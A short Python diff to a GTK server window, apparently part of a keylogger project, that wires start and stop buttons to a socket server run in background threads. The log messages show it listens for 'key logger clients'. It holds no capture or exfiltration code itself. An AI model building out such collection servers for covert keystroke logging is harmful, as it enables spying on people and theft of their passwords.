@@ -15,6 +15,8 @@ __email__ = "sunhick@gmail.com"
 
 
 import logging
+import thread
+from ServerSocket import ServerSocket
 from gi.repository import Gtk
 
 
@@ -38,8 +40,12 @@ class ServerWindow(Gtk.Window):
         self._stop_button.connect("clicked", self.stop_listening)
         self._grid.add(self._stop_button)
 
+        self._server_sock = ServerSocket()
+
     def start_listening(self, widget):
         self._log.info('Starting listening to the key logger clients')
+        thread.start_new_thread(self._server_sock.start, ())
 
     def stop_listening(self, widget):
         self._log.info('Stop listening to the key logger clients')
+        thread.start_new_thread(self._server_sock.stop, ())
